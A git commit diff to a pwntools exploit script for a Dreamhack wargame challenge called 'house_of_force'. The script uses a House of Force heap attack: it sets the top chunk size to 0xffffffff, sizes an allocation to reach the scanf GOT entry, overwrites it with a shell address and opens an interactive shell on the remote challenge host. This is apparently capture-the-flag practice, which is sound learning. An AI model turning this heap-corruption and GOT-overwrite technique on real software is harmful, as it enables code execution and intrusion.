e9af04cb6a5d5815bb91ae06d141529275fc1ab9
woounnan <woounnan@gmail.com>
2020-12-06 04:50:44 +0000

    t

--- dreamhack/house_of_force/ex.py
+++ dreamhack/house_of_force/ex.py
@@ -1,5 +1,4 @@
 from pwn import *
-update.context(log_level = 'debug')
 
 def Create(size, data):
     p.sendlineafter('> ', '1')
@@ -13,23 +12,24 @@ def Write(idx, offset, value):
     p.sendlineafter(': ', str(value))
     
 #p = process('house_of_force')
-p = remote('host1.dreamhack.games', 9372)
+p = remote('host1.dreamhack.games', 19605)
 _recv = Create(8, 'a'*8)
 addr_heap = int(_recv.split(': ')[0], 16)
 addr_firstChunk = addr_heap + 0x10
 addr_firstChunkSize = addr_firstChunk - 4
 addr_shell = 0x804887e
 elf = ELF('house_of_force')
-addr_got_puts = elf.got['puts']
-addr_target = addr_got_puts
+addr_got = elf.got['__isoc99_scanf']
+addr_target = addr_got
 size_exploit = addr_target - addr_firstChunk
-size_exploit = size_exploit - 8 if size_exploit % 16 == 0 else (size_exploit - 16) + 16 - ((size_exploit - 16) % 16) - 8
+size_exploit = size_exploit - 8 if size_exploit % 8 == 0 else size_exploit - 8 + (8 - size_exploit%8) - 8
+addr_calc = addr_firstChunk + size_exploit + 8
+Write(0, 12/4, 0xffffffff)
+Create(size_exploit, 'a')
 log.info('exploit size: ' + hex(size_exploit))
 log.info('heap: ' + hex(addr_heap))
-Write(0, 12/4, 0xffffffff)
-Create(size_exploit, 'A'*size_exploit)
-#raw_input('debug: ' + str(p.pid))
-#Create(8, p32(addr_shell)*2)
-Create(8, p32(addr_got_puts)*2)
+log.info('got: ' + hex(addr_got))
+log.info('calculated address: ' + hex(addr_calc))
+Create(4*50, p32(addr_shell)*((addr_target - addr_calc)/4 + 1) + '\x00')
 p.interactive()
 
